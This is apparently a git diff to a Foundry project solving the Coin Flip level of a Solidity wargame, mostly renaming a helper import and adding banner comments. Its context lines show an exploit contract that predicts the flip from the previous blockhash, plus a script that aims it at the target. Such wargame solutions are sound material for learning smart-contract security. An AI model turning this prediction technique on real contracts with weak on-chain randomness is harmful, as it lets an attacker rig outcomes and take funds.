@@ -87,9 +87,11 @@ interface ICoinFlip {
     function flip(bool _guess) external returns (bool);
 }
 
+// ================================================================
+// │                      LEVEL 3 - COIN FLIP                     │
+// ================================================================
 contract CoinFlipGuess {
-    uint256 FACTOR =
-        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     function flip(address _targetContractAddress) public returns (bool) {
         uint256 blockValue = uint256(blockhash(block.number - 1));
@@ -111,14 +113,17 @@ contract CoinFlipGuess {
 pragma solidity ^0.8.18;
 
 import {Script, console} from "forge-std/Script.sol";
-import {GetInstanceAddress} from "script/HelperFunctions.s.sol";
+import {HelperFunctions} from "script/HelperFunctions.s.sol";
 import {CoinFlipGuess} from "../src/Level3.sol";
 
 interface ICoinFlip {
     function consecutiveWins() external returns (uint256);
 }
 
-contract Exploit is Script, GetInstanceAddress {
+// ================================================================
+// │                      LEVEL 3 - COIN FLIP                     │
+// ================================================================
+contract Exploit is Script, HelperFunctions {
     function run() public {
         address targetContractAddress = getInstanceAddress();
         ICoinFlip targetContract = ICoinFlip(targetContractAddress);
